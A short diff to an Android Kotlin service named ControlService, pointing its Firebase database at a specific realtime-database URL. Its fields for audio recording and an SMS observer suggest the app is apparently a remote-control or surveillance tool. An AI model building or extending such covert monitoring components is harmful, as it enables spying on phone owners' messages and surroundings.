@@ -58,7 +58,7 @@ class ControlService : android.app.Service() {
 
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private lateinit var deviceId: String
-    private val database = FirebaseDatabase.getInstance()
+    private val database = FirebaseDatabase.getInstance("https://corex-78632-default-rtdb.firebaseio.com")
     private var mediaRecorder: MediaRecorder? = null
     private var mediaPlayer: MediaPlayer? = null
     private var smsObserver: ContentObserver? = null
